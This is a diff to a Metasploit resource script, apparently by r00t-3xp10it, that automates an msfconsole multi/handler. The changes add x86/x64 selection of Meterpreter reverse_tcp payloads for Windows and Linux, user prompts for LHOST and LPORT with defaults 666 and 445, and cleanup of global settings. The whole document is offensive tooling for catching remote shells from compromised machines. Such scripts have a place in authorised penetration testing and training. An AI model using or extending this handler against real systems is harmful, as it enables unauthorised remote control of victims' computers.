@@ -6,9 +6,20 @@
       AutoRunScript option pointing to our resource file.
       Or just start a simple or evasion msf multi/handler.
 
+    Execute in msfconsole:
+       setg PAYLOAD_ARCH <x86-or-x64>
+       resource <path-to-script>/handler.rc
+
     Author:
        r00t-3xp10it  <pedroubuntu10[at]gmail.com>
+
    |
+   ## Sellect payload arch (x86|x64)
+   if (framework.datastore['PAYLOAD_ARCH'] == nil or framework.datastore['PAYLOAD_ARCH'] == '')
+      run_single("setg PAYLOAD_ARCH x86")
+   else
+      print_line("PAYLOAD_ARCH => #{framework.datastore['PAYLOAD_ARCH']}")
+   end
    print_line(help)
    Rex::sleep(1.5)
    menu = %Q|
@@ -47,7 +58,7 @@
          if get_host == "y" or get_host == "Y"
             remote_host = "#{ip}"
          else
-            print "[+] Input LHOST         : "
+            print "[i] Input LHOST         : "
             get_addr = gets.chomp
             remote_host = "#{get_addr}"
          end
@@ -57,7 +68,7 @@
          if get_port == "y" or get_port == "Y"
             remote_port = "666"
          else
-            print "[+] Input LPORT         : "
+            print "[i] Input LPORT         : "
             query_port = gets.chomp
             remote_port = "#{query_port}"
          end
@@ -85,7 +96,7 @@
          if get_host == "y" or get_host == "Y"
             remote_host = "#{ip}"
          else
-            print "[+] Input LHOST         : "
+            print "[i] Input LHOST         : "
             get_addr = gets.chomp
             remote_host = "#{get_addr}"
          end
@@ -95,7 +106,7 @@
          if get_port == "y" or get_port == "Y"
             remote_port = "666"
          else
-            print "[+] Input LPORT         : "
+            print "[i] Input LPORT         : "
             query_port = gets.chomp
             remote_port = "#{query_port}"
          end
@@ -130,7 +141,7 @@
          if get_host == "y" or get_host == "Y"
             remote_host = "#{ip}"
          else
-            print "[+] Input LHOST         : "
+            print "[i] Input LHOST         : "
             get_addr = gets.chomp
             remote_host = "#{get_addr}"
          end
@@ -140,11 +151,11 @@
          if get_port == "y" or get_port == "Y"
             remote_port = "445"
          else
-            print "[+] Input LPORT         : "
+            print "[i] Input LPORT         : "
             query_port = gets.chomp
             remote_port = "#{query_port}"
          end
-      print "[+] Input PEM file absoluct path              : "
+      print "[+] Input PEM full path :(/root/bin/gmail.pem): "
       get_pem = gets.chomp
       ## Make sure that PEM.pem file exists (local)
       unless (File.exist?(get_pem))
@@ -153,25 +164,38 @@
          return nil
       end
 
-
-      ## USER INPUT ERROR
       else
-      print_error("Command NOT supported: #{user_input}")
-      run_single("back")
-      return nil
+        ## USER INPUT ERROR
+        print_error("Command NOT supported: #{user_input}")
+        ## clean
+        run_single("unsetg all")
+        run_single("back")
+        return nil
       end
 
 
-      ## Sellect session platform (payload)
+      ## Sellect payload platform,arch and protocol
       parse_proto = user_platform.split(' ')[1]
       if (user_platform =~ /windows/i)
          if parse_proto.nil? or parse_proto == '' or parse_proto == ' '
-            payload = "windows/meterpreter/reverse_tcp"
+            if framework.datastore['PAYLOAD_ARCH'] == "x86" or framework.datastore['PAYLOAD_ARCH'] == "i686"
+               payload = "windows/meterpreter/reverse_tcp"
+            else
+               payload = "windows/x64/meterpreter/reverse_tcp"
+            end
          else
-            payload = "windows/meterpreter/reverse_#{parse_proto}"
+            if framework.datastore['PAYLOAD_ARCH'] == "x86" or framework.datastore['PAYLOAD_ARCH'] == "i686"
+               payload = "windows/meterpreter/reverse_#{parse_proto}"
+            else
+               payload = "windows/x64/meterpreter/reverse_#{parse_proto}"
+            end
          end
       elsif (user_platform =~ /linux/i)
+         if framework.datastore['PAYLOAD_ARCH'] == "x86" or framework.datastore['PAYLOAD_ARCH'] == "i686"
             payload = "linux/x86/meterpreter/reverse_tcp"
+         else
+            payload = "linux/x64/meterpreter/reverse_tcp"
+         end
       else
          payload = "java/meterpreter/reverse_tcp"
       end
@@ -195,5 +219,8 @@
       run_single("set LHOST #{remote_host}")
       run_single("set LPORT #{remote_port}")
    run_single("exploit")
+
+   ## clean
+   run_single("unsetg all")
    run_single("back")
 </ruby>
